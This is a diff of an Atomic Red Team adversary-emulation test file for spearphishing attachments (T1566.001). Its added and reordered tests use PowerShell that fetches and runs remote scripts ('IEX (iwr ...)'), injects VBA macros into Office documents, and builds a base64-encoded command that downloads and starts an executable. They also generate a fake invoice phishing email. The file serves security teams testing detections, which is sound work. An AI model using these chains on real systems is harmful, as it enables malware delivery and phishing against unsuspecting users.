@@ -1,64 +1,284 @@
 attack_technique: T1566.001
 display_name: 'Phishing: Spearphishing Attachment'
 atomic_tests:
-- name: Download Phishing Attachment - VBScript
-  auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
-  description: |
-    The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
-    The below will successfully download the macro-enabled Excel file to the current location.
-  supported_platforms:
-  - windows
-  executor:
-    command: |
-      if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
-        return 'Please install Microsoft Excel before running this test.'
-      }
-      else{
-        $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
-        $fileName = 'PhishingAttachment.xlsm'
-        New-Item -Type File -Force -Path $fileName | out-null
-        $wc = New-Object System.Net.WebClient
-        $wc.Encoding = [System.Text.Encoding]::UTF8
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        ($wc.DownloadString("$url")) | Out-File $fileName
-      }
-    name: powershell
-- name: Word spawned a command shell and used an IP address in the command line
-  auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
-  description: |
-    Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.
-    Upon execution, CMD will be lauchned and ping 8.8.8.8
-  supported_platforms:
-  - windows
-  input_arguments:
-    jse_path:
-      description: |
-        Path for the macro to write out the "malicious" .jse file
-      type: String
-      default: C:\Users\Public\art.jse
-    ms_product:
-      description: Maldoc application Word or Excel
-      type: String
-      default: Word
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: "16.0"
-  dependency_executor_name: powershell
-  dependencies:
-  - description: |
-      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
-    prereq_command: |
-      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-    get_prereq_command: |
-      $msword = New-Object -ComObject word.application
-      Stop-Process -Name WINWORD
-  executor:
-    command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
-      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
-      Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
-    cleanup_command: |
-      if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
-      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
-    name: powershell
+-   name: Word spawned a command shell and used an IP address in the command line
+    auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
+    description: |
+        Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.
+        Upon execution, CMD will be lauchned and ping 8.8.8.8
+    supported_platforms:
+    -   windows
+    input_arguments:
+        jse_path:
+            description: |
+                Path for the macro to write out the "malicious" .jse file
+            type: String
+            default: C:\Users\Public\art.jse
+        ms_product:
+            description: Maldoc application Word or Excel
+            type: String
+            default: Word
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+            $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+            Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
+        cleanup_command: |
+            if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
+            Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+        name: powershell
+-   name: Chained - Email > Maldoc > Powershell Encoded Command > Executable Download
+        > Run Executable
+    auto_generated_guid:
+    description: |
+        This is a custom variant of the non custom labeled test. This allows a user to specifically define all aspects of the powershell command, document and email. The test uses a powershell script to generate an VBA code to add to a document, which is then attached to an email. THe email is opened, the document is opened, and the VBA code is executed. The VBA code will execute cmd to launch powershell to download a "first stage" benign malware. The benign executable will launch windows shell, powershell and reach out to api.ipify.org and google.com before exiting.
+        Execution is handled by [Invoke-DocPhish](https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1566.001/bin/docPhish.ps1) to load and execute VBA code into Excel or Word documents.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+        executable_name:
+            description: Name of the final executable powershell will start (omit
+                extension)
+            type: String
+            default: 168
+        executable_location:
+            description: Where to save the downloaded executable
+            type: String
+            default: $env:temp\
+        email_filename:
+            description: What file name for the saved email file (omit extension)
+            type: String
+            default: invoice_12857498A
+        email_savepath:
+            description: Where should the email be stored. This can be changed to
+                Outlook TEMP folder if desired (Windows 10 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache,
+                Win 7 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary
+                Internet Files)
+            type: String
+            default: $env:temp
+        doc_savepath:
+            description: Where should the document be stored. This can be changed
+                to Outlook TEMP folder if desired (Windows 10 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache,
+                Win 7 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary
+                Internet Files)
+            type: String
+            default: $env:temp
+        doc_name:
+            description: Name of the document to attach to the email
+            type: String
+            default: Invoice 12857498A
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously, with Outlook being closed (Powershell script will check for Outlook running and close if need be). Run -GetPrereqs to run msword and build dependant registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            IEX (iwr "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1566.001/bin/docPhish.ps1")
+            $MsgLocation = Join-Path -Path "#{email_savepath}" -ChildPath "#{email_filename}.msg"
+            $DocLocation = Join-Path -Path "#{doc_savepath}" -ChildPath "#{doc_name}.doc"
+            Invoke-DocPhish -Generate Msg -DocName "#{doc_name}" -DocPath "#{doc_savepath}" -MsgName "#{email_filename}" -MsgPath "#{email_savepath}" -ExeName "#{executable_name}" -ExePath "#{executable_location}" -Execute "True"
+        cleanup_command: |
+            Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\Word\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+            $ExecutablePath = Join-Path -Path "#{executable_location}" -ChildPath "#{executable_name}.exe"
+            $MsgLocation = Join-Path -Path "#{email_savepath}" -ChildPath "#{email_filename}.msg"
+            $DocLocation = Join-Path -Path "#{doc_savepath}" -ChildPath "#{doc_name}.doc"
+            $TempDocLocation = Join-Path -Path $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache -ChildPath "#{doc_name}.doc"
+            Remove-Item "$ExecutablePath" -ErrorAction Ignore
+            Remove-Item "$MsgLocation" -ErrorAction Ignore
+            Remove-Item "$DocLocation" -ErrorAction Ignore
+            Remove-Item "$TempDocLocation" -ErrorAction Ignore
+        name: powershell
+-   name: Download Phishing Attachment - VBScript
+    auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
+    description: |
+        The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
+        The below will successfully download the macro-enabled Excel file to the current location.
+    supported_platforms:
+    -   windows
+    executor:
+        command: |
+            if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
+              return 'Please install Microsoft Excel before running this test.'
+            }
+            else{
+              $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+              $fileName = 'PhishingAttachment.xlsm'
+              New-Item -Type File -Force -Path $fileName | out-null
+              $wc = New-Object System.Net.WebClient
+              $wc.Encoding = [System.Text.Encoding]::UTF8
+              [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+              ($wc.DownloadString("$url")) | Out-File $fileName
+            }
+        name: powershell
+-   name: Chained Custom - Email > Maldoc > Powershell Encoded Command > Executable
+        Download > Run Executable
+    auto_generated_guid:
+    description: |
+        This is a custom variant of the non custom labeled test. This allows a user to specifically define all aspects of the powershell command, document and email. The test uses a powershell script to generate an VBA code to add to a document, which is then attached to an email. THe email is opened, the document is opened, and the VBA code is executed. The VBA code will execute cmd to launch powershell to download a "first stage" benign malware. The benign executable will launch windows shell, powershell and reach out to api.ipify.org and google.com before exiting.
+        Execution is handled by [Invoke-DocPhish](https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1566.001/bin/docPhish.ps1) to load and execute VBA code into Excel or Word documents.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+        executable_name:
+            description: Name of the final executable powershell will start (omit
+                extension)
+            type: String
+            default: 168
+        download_url:
+            description: Where to download the executable
+            type: Url
+            default: https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe
+        executable_location:
+            description: Where to save the downloaded executable
+            type: String
+            default: $env:temp\
+        email_filename:
+            description: What file name for the saved email file (omit extension)
+            type: String
+            default: invoice_12857498A
+        email_recipient:
+            description: Who do you want the email to appear to be sent to (Sender
+                is not currently supported)
+            type: String
+            default: doe@example.com
+        email_subject:
+            description: What subject to add to the email
+            type: String
+            default: Invoice 12857498A
+        email_body:
+            description: What text to put into the email body, must be single line
+                with <backtick>r<backtick>n for new lines
+            type: String
+            default: Hello,`r`n`r`nPlease see the attached document for the information
+                you requested`r`n`r`nRespectfully,`r`n`r`nSupport
+        email_savepath:
+            description: Where should the email be stored. This can be changed to
+                Outlook TEMP folder if desired (Windows 10 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache,
+                Win 7 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary
+                Internet Files)
+            type: String
+            default: $env:temp
+        doc_savepath:
+            description: Where should the document be stored. This can be changed
+                to Outlook TEMP folder if desired (Windows 10 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache,
+                Win 7 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary
+                Internet Files)
+            type: String
+            default: $env:temp
+        doc_name:
+            description: Name of the document to attach to the email
+            type: String
+            default: Invoice 12857498A
+        doc_image_location:
+            description: Name of the image to insert into the document
+            type: String
+            default: Default
+        execute_file:
+            description: True or False if you want to execute the msg or document
+            type: String
+            default: true
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously, with Outlook being closed (Powershell script will check for Outlook running and close if need be). Run -GetPrereqs to run msword and build dependant registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            IEX (iwr "https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1566.001/bin/docPhish.ps1")
+            $MsgLocation = Join-Path -Path "#{email_savepath}" -ChildPath "#{email_filename}.msg"
+            $DocLocation = Join-Path -Path "#{doc_savepath}" -ChildPath "#{doc_name}.doc"
+            if ("#{doc_image_location}" -like "C:\*"){ $PathToImage = "#{doc_image_location}"}else{$PathToImage = Join-Path -Path $PathToAtomicsFolder -ChildPath #{doc_image_location}}
+            Invoke-DocPhish -Generate Msg -DocName "#{doc_name}" -DocPath "#{doc_savepath}" -MsgName "#{email_filename}" -MsgPath "#{email_savepath}" -MsgTo "#{email_recipient}" -MsgSubject "#{email_subject}" -MsgBody "#{email_body}" -ExeName "#{executable_name}" -ExePath "#{executable_location}" -ExeUrl "#{download_url}" -Execute "#{execute_file}" -DocImage "$PathToImage"
+        cleanup_command: |
+            Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\Word\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+            $ExecutablePath = Join-Path -Path "#{executable_location}" -ChildPath "#{executable_name}.exe"
+            $MsgLocation = Join-Path -Path "#{email_savepath}" -ChildPath "#{email_filename}.msg"
+            $DocLocation = Join-Path -Path "#{doc_savepath}" -ChildPath "#{doc_name}.doc"
+            $TempDocLocation = Join-Path -Path $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache -ChildPath "#{doc_name}.doc"
+            Remove-Item "$ExecutablePath" -ErrorAction Ignore
+            Remove-Item "$MsgLocation" -ErrorAction Ignore
+            Remove-Item "$DocLocation" -ErrorAction Ignore
+            Remove-Item "$TempDocLocation" -ErrorAction Ignore
+        name: powershell
+-   name: Chained - Maldoc > Powershell Encoded Command > Executable Download > Run
+        Executable
+    auto_generated_guid: 0330a5d2-a45a-4272-a9ee-e364411c4b18
+    description: |
+        This Test uses a VBA macro to execute cmd to launch powershell to download a "first stage" benign malware. The benign executable will launch windows shell, powershell and reach out to api.ipify.org and google.com before exiting.
+        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        ms_product:
+            description: Maldoc application Word or Excel
+            type: String
+            default: Word
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+        executable_name:
+            description: Name of the final executable powershell will start
+            type: String
+            default: 168.exe
+        download_url:
+            description: Where to download the executable
+            type: Url
+            default: https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe
+        executable_location:
+            description: Where to save the downloaded executable
+            type: String
+            default: $env:temp\
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+            $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
+            $Command = "`$client = new-object System.Net.WebClient; `$client.DownloadFile(`"#{download_url}`",`"$ExecutablePath`"); Start-Process -Filepath `"$ExecutablePath`""
+            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
+            $EncodedCommand = [Convert]::ToBase64String($Bytes)
+            $macrocode = "Shell `"powershell.exe -EncodedCommand $EncodedCommand`""
+            Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
+        cleanup_command: |
+            $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
+            Remove-Item $ExecutablePath -ErrorAction Ignore
+            Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+        name: powershell
